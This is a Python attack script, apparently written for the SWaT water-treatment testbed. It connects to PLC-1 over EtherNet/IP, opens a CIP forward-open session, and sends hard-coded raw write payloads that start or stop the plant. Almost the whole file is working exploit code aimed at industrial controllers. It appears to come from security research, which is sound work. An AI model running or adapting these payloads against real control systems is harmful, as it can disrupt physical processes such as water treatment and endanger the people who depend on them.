'''
An attack script that can start or stop the SWaT Plant via sending crafted
packets to the PLC that controls the state of other PLCs
in this case PLC-1 which controls.
'''
from scapy.all import *
import binascii
import logging
import sys
import struct

from cip import CIP, CIP_Path, CIP_RespForwardOpen
import plc

logging.basicConfig(format='[%(levelname)s] %(message)s', level=logging.DEBUG)
logger = logging.getLogger(__name__)

'''
Global Var to define script control type: start / stop / input
0 = stop plant
1 = start plant
2 = ask user input to start/stop
'''
FUNC = 1


def get_hex_list(bytes_str):
    '''
    Returns a list of hex values
    '''
    hex_list = []
    for b in bytes_str:
        hex_list.append(hex(ord(b)))
    return hex_list


def convert_hex_list_to_int(input_list):
    '''
    Returns the int value of a hex list after concatenating
    '''
    l_bytes = ''.join([chr(int(c, 16)) for c in input_list])
    value = struct.unpack('<I', l_bytes)[0]
    return value


def get_raw_pkts():
    '''
    Returns a dictionary of RAW CIP packets
    '''
    start_payload1 = binascii.unhexlify('4d04206b2500c0b32801c1000100ff')
    start_payload2 = binascii.unhexlify('4d04206b2500c0b32801c100010000')
    stop_payload1 = binascii.unhexlify('4d04206b2500c0b32802c1000100ff')
    stop_payload2 = binascii.unhexlify('4d04206b2500c0b32802c100010000')
    fwopen = binascii.unhexlify('540220062401069b000000000d470080'
                                '0d474d006c4488130200000080841e00'
                                'f84380841e00f843a303010020022401')
    fwclose = binascii.unhexlify('4e022006240100f90d474d006c448813'
                                 '0300010020022401')
    rawpkts = {
        "start_payload1": start_payload1,
        "start_payload2": start_payload2,
        "stop_payload1": stop_payload1,
        "stop_payload2": stop_payload2,
        "fwopen": fwopen,
        "fwclose": fwclose
    }
    return rawpkts


def construct_cip_pkts():
    '''
    Encapsulate the raw packets in CIP
    '''
    rawpkts = get_raw_pkts()
    cippkts = {}
    for key in rawpkts:
        cippkts[key] = CIP(rawpkts[key])
    return cippkts


def get_payloads(pkts):
    '''
    Returns payloads based on FUNC type
    '''
    if FUNC == 0:
        print("FUNC 0 - Stop Plant")
        payloads = [pkts["stop_payload1"], pkts["stop_payload2"]]
        return payloads
    if FUNC == 1:
        print("FUNC 1 - Start Plant")
        payloads = [pkts["start_payload1"], pkts["start_payload2"]]
        return payloads
    if FUNC == 2:
        print("FUNC 2 - User Input")
        choice = input("Start/Stop Plant? > ")
        while choice.lower != "start" or choice.lower != "stop":
            if choice.lower() == "start":
                payloads = [pkts["start_payload1"], pkts["start_payload2"]]
                return payloads
            elif choice.lower() == "stop":
                payloads = [pkts["stop_payload1"], pkts["stop_payload2"]]
                return payloads
            else:
                choice = input("Start/Stop Plant?")


def send_payloads(client, payloads):
    '''
    Sends payload via CIP send unit data requests
    '''
    count = 1
    for payload in payloads:
        print("Sending Payload {}".format(count))
        client.send_unit_cip(payload)
        count += 1
        # Receive the response and show it
        resppkt = client.recv_enippkt()
        cippkt = resppkt[CIP]
        load = cippkt.load
        status = load[2:3]
        if status != b'\x00':
            logger.error("Sending Payload Failed: %r", status)
            cippkt.show()
            return False
        else:
            print("Success!")
    return True


def send_forward_open(client, cippkt):
    '''
    Sends a forward open request packet to plc to initiate a session
    '''
    client.send_rr_cip(cippkt)
    resppkt = client.recv_enippkt()
    cippkt = resppkt[CIP]
    load = cippkt.load
    status = load[2:3]
    if status != b'\x00':
        logger.error(
            "Failed to Forward Open CIP Connection: %r", status)
        return False
    assert isinstance(cippkt.payload, CIP_RespForwardOpen)
    enip_connid_str = str(cippkt)[4:8]
    enip_connid_hex_list = get_hex_list(enip_connid_str)
    enip_connid = convert_hex_list_to_int(enip_connid_hex_list)
    client.enip_connid = enip_connid
    print("Established Forward Open CIP Connection: {}"
          .format(hex(enip_connid)))
    return True


def send_forward_close(client, cippkt):
    '''
    Send a forward close request packet to plc to close session
    '''
    client.send_rr_cip(cippkt)
    resppkt = client.recv_enippkt()
    cippkt = resppkt[CIP]
    load = cippkt.load
    status = load[2:3]
    if status != b'\x00':
        logger.error("Failed to Forward Close CIP Connection: %r", status)
        return False
    print(
        "Closed Forward Open CIP Connection: {}".format(
            hex(client.enip_connid)))
    return True


def connect_plc(ip):
    '''
    Creates a socket object which connects to the plc
    '''
    client = plc.PLCClient(ip)
    if not client.connected:
        print("Unable to connect")
        sys.exit(1)
    print("Established Session: {}".format(hex(client.session_id)))
    return client


def main():
    '''
    Main Function
    '''
    # Construct CIP packets of payloads to send
    pkts = construct_cip_pkts()
    payloads = get_payloads(pkts)

    # Connect to PLC
    client = connect_plc('192.168.1.10')
    # client = connect_plc('192.168.41.1')

    # Send forward open request
    fwopenpkt = pkts["fwopen"]
    if not send_forward_open(client, fwopenpkt):
        sys.exit(1)

    # Send CIP WriteTag request for payloads
    if not send_payloads(client, payloads):
        sys.exit(1)

    # Close the connection
    fwclosepkt = pkts["fwclose"]
    if not send_forward_close(client, fwclosepkt):
        sys.exit(1)
    print("Closing Session: {}".format(hex(client.session_id)))
    client.sock.shutdown(1)
    client.sock.close()


if __name__ == '__main__':
    main()
